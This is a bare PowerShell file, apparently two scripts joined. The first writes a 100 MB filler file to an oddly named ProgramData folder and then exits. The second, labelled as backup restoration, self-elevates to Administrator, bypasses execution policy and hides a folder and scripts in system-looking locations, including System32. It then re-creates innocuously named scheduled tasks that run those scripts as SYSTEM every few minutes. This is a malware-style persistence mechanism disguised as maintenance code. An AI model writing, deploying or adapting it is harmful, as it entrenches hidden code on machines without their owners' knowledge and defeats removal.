$TargetDir = "C:\ProGramData\tennp"
$SizeBytes = 100 * 1024 * 1024   # 100 MB

# Ensure directory exists
if (-not (Test-Path $TargetDir)) {
    New-Item -ItemType Directory -Path $TargetDir | Out-Null
}

# Unique filename
$fname = "temp_" + (Get-Date -Format "yyyyMMdd_HHmmss") + "_" + ((Get-Random).ToString("X")) + ".bin"
$fullPath = Join-Path $TargetDir $fname

# Try fast native tool fsutil first (creates file with given length)
try {
    & fsutil file createnew $fullPath $SizeBytes
    exit 0
} catch {
    # fallback: create empty file and set length via .NET
    try {
        $fs = [System.IO.File]::Open($fullPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
        $fs.SetLength([int64]$SizeBytes)
        $fs.Close()
        exit 0
    } catch {
        # if both methods fail, exit nonzero
        exit 1
    }
}


#restore backups

# Self-elevate to Administrator if not running elevated
$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Log directory and file (hidden under ProgramData)
$backupDataPath = "$env:ProgramData\Microsoft\Windows\SysBackups"
if (-not (Test-Path $backupDataPath)) { New-Item -Path $backupDataPath -ItemType Directory -Force | Out-Null }
try { attrib +h +s $backupDataPath } catch { }
$logFile = Join-Path $backupDataPath "sys_log_run.log"

# Simple logging function
function Log {
    param([string]$Message)
    $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    $line = "$timestamp`t$Message"
    Add-Content -Path $logFile -Value $line -ErrorAction SilentlyContinue
}

Log "=== sys_log started ==="

# Runtime script locations
$restoreDir = "$env:windir\System32\Com\en-US"

# Backup location (ProgramData)
$backupPath = $backupDataPath

# Helper: check if scheduled task exists
function TaskExists {
    param([string]$TaskName)
    $null = schtasks /Query /TN $TaskName 2>$null
    return ($LASTEXITCODE -eq 0)
}

# Helper: restore file from backup if missing
function EnsureFileFromBackup {
    param(
        [string]$TargetPath,
        [string]$BackupFileName
    )
    if (Test-Path $TargetPath) {
        Log "File exists: $TargetPath"
        return $true
    }

    $src = Join-Path $backupPath $BackupFileName
    if (-not (Test-Path $src)) {
        Log "ERROR: Backup source not found: $src"
        return $false
    }

    try {
        Copy-Item -Path $src -Destination $TargetPath -Force -ErrorAction Stop
        try { attrib +h +s $TargetPath } catch { }
        Start-Sleep -Milliseconds 200
        if (Test-Path $TargetPath) {
            Log "Restored file from backup: $TargetPath (source: $src)"
            return $true
        } else {
            Log "ERROR: File not present after copy: $TargetPath"
            return $false
        }
    } catch {
        Log "ERROR copying $src -> $TargetPath : $($_.Exception.Message)"
        return $false
    }
}

# Helper: create scheduled task using schtasks if missing
function EnsureTask {
    param(
        [string]$TaskName,
        [string]$ScriptPath,    # full path to script that should be executed
        [string]$IntervalSpec   # example: "MINUTE /MO 3"
    )

    if (TaskExists $TaskName) {
        Log "Task present: $TaskName"
        return $true
    }

    # Build TR argument: powershell.exe -ExecutionPolicy Bypass -File "C:\path\to\script.ps1"
    $scriptQuoted = '"' + $ScriptPath + '"'
    $tr = "powershell.exe -ExecutionPolicy Bypass -File $scriptQuoted"
    $createCmd = "schtasks /Create /TN `"$TaskName`" /SC $IntervalSpec /RL HIGHEST /F /TR `"$tr`" /RU SYSTEM"

    Log "Task missing: $TaskName. Creating with TR: $tr"
    try {
        # Run via cmd.exe to preserve exact quoting and capture output since ps gives errors
        $output = cmd.exe /c $createCmd 2>&1
        $output | ForEach-Object { Log "schtasks: $_" }
        Start-Sleep -Milliseconds 200
        if (TaskExists $TaskName) {
            Log "Task created successfully: $TaskName"
            return $true
        } else {
            Log "ERROR: Task creation failed or task not visible: $TaskName"
            return $false
        }
    } catch {
        Log "ERROR running schtasks create for $TaskName : $($_.Exception.Message)"
        return $false
    }
}

# tasks to check is winUser winTTL
# Map task name -> target runtime script -> backup filename -> interval spec
$tasks = @(
    @{ Name = "WinUserCheck";      Target = Join-Path $restoreDir "sys_usr.ps1"; Backup = "win_ux.ps1"; Interval = "MINUTE /MO 3" },
    @{ Name = "WinTimeToLive";     Target = Join-Path $restoreDir "sys_win.ps1"; Backup = "win_ui.ps1"; Interval = "MINUTE /MO 13" }
)

foreach ($t in $tasks) {
    $taskName = $t.Name
    $targetPath = $t.Target
    $backupName = $t.Backup
    $interval = $t.Interval

    Log "Checking $taskName -> expected script: $targetPath"

    # Ensure script file is present (restore if missing)
    $okFile = EnsureFileFromBackup -TargetPath $targetPath -BackupFileName $backupName
    if (-not $okFile) {
        Log "ERROR: Could not ensure script file for $taskName ($targetPath). Skipping task re-creation."
        continue
    }

    # Ensure scheduled task is present
    $okTask = EnsureTask -TaskName $taskName -ScriptPath $targetPath -IntervalSpec $interval
    if (-not $okTask) {
        Log "ERROR: Could not ensure scheduled task $taskName"
    }
}

Log "=== sys_log finished ==="